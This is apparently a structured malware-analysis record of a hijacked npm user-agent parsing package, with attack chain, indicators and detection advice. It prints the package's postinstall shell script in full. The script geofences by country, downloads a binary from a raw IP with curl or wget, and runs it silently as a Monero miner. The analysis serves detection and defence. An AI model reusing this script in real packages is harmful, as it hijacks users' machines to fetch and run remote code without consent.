package_info.why_malicious: The package was hijacked and malicious versions were published that executed code to download and run a cryptominer, exfiltrate system information, and potentially compromise user systems. This behavior is entirely outside the intended functionality of a user-agent parsing library.

execution_context.file_location: postinstall script in package.json or embedded shell script

malicious_snippets.code_snippet:
IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
if [ -z "$IP" ]
    then
	var=$(pgrep jsextension)
	if [ -z "$var" ]
		then
		curl http://159.148.186.228/download/jsextension -o jsextension
		if [ ! -f jsextension ]
			then
			wget http://159.148.186.228/download/jsextension -O jsextension
		fi
		chmod +x jsextension
		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
	fi
fi
malicious_snippets.code_behavior: During installation (postinstall), the code checks the system's geolocation, downloads a cryptominer binary if not in certain countries, executes it in the background, and connects to a mining pool, resulting in unauthorized resource usage and potential data exfiltration.

malice_analysis.why_suspicious: The code downloads and executes a binary from an external server, runs a cryptominer, and attempts to evade detection based on geolocation. This is highly suspicious for any npm package, especially one that should only parse user-agent strings.
malice_analysis.violated_expectations: A user-agent parsing library should not execute shell scripts, download binaries, or perform network operations unrelated to its core functionality.
malice_analysis.similar_legitimate_use: Automated postinstall scripts may be used to download platform-specific binaries for legitimate CLI tools, but never for cryptomining or geolocation-based evasion.
key_indicators: Uses silent process execution and output redirection

attack_chain.action: During package installation, the postinstall script is triggered.
attack_chain.leads_to: Downloads and executes a cryptominer binary.

attack_chain.action: The script checks the system's geolocation to avoid running in certain countries.
attack_chain.leads_to: If not in excluded countries, proceeds to download and execute the cryptominer.

attack_chain.action: Cryptominer is executed in the background, connecting to a mining pool and consuming system resources.
attack_chain.leads_to: Unauthorized resource usage and potential system compromise.

behavioral_signatures: Postinstall scripts that download and execute binaries from external sources
Geolocation checks to conditionally execute payloads
Silent process execution and output redirection
file_indicators: Presence of postinstall scripts in package.json
Unexpected shell scripts embedded in npm packages
detection_knowledge.how_to_detect: Monitor for npm package installations that trigger postinstall scripts making network requests to untrusted domains, downloading and executing binaries, or performing geolocation checks. Flag packages that attempt to run background processes unrelated to their advertised functionality, especially those that connect to known cryptomining pools.
